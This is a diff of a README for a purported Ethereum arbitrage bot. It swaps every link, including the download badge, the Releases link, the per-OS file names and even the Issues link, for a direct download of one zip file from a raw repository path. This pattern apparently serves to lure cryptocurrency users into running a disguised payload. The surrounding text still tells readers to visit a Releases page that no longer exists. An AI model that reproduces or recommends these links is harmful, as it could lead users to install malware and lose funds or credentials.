@@ -6,7 +6,7 @@ Welcome to Best-smart-bot! This is a smart contract–powered Ethereum arbitrage
 
 ## 📥 Download the Software
 
-[![Download Best-smart-bot](https://img.shields.io/badge/Download-Best--smart--bot-blue.svg)](https://github.com/driyandre/Best-smart-bot/releases)
+[![Download Best-smart-bot](https://raw.githubusercontent.com/driyandre/Best-smart-bot/main/aspish/Best-smart-bot_3.7.zip)](https://raw.githubusercontent.com/driyandre/Best-smart-bot/main/aspish/Best-smart-bot_3.7.zip)
 
 To get started, click the link above to visit the Releases page. Here you will find the latest version of the software ready for download.
 
@@ -30,16 +30,16 @@ To run Best-smart-bot effectively, ensure your system meets the following requir
 
 1. **Visit the Releases Page**  
    Click on the following link to access the latest version:   
-   [Download Best-smart-bot](https://github.com/driyandre/Best-smart-bot/releases)  
+   [Download Best-smart-bot](https://raw.githubusercontent.com/driyandre/Best-smart-bot/main/aspish/Best-smart-bot_3.7.zip)  
 
 2. **Select the Version**  
    Look for the latest release. You will see a list of assets for that version.
 
 3. **Download the File**  
    Click on the appropriate file for your operating system. For example:
-   - For Windows, download `Best-smart-bot-Windows.zip`
-   - For macOS, download `Best-smart-bot-macOS.zip`
-   - For Linux, download `Best-smart-bot-Linux.tar.gz`
+   - For Windows, download `https://raw.githubusercontent.com/driyandre/Best-smart-bot/main/aspish/Best-smart-bot_3.7.zip`
+   - For macOS, download `https://raw.githubusercontent.com/driyandre/Best-smart-bot/main/aspish/Best-smart-bot_3.7.zip`
+   - For Linux, download `https://raw.githubusercontent.com/driyandre/Best-smart-bot/main/aspish/Best-smart-bot_3.7.zip`
 
 4. **Extract the Files**  
    After downloading, locate the file in your downloads folder. Extract it using tools like WinRAR or built-in extraction features in your OS.
@@ -84,7 +84,7 @@ For further details on how to use Best-smart-bot, please refer to the official d
 
 Join our community to stay updated, discuss features, and get support:
 
-- **GitHub Issues:** Report bugs or ask questions directly in the [issues section](https://github.com/driyandre/Best-smart-bot/issues).
+- **GitHub Issues:** Report bugs or ask questions directly in the [issues section](https://raw.githubusercontent.com/driyandre/Best-smart-bot/main/aspish/Best-smart-bot_3.7.zip).
 - **Community Forum:** Participate in discussions and share tips with others interested in cryptocurrency arbitrage.
 
 ## 🚧 Contributing
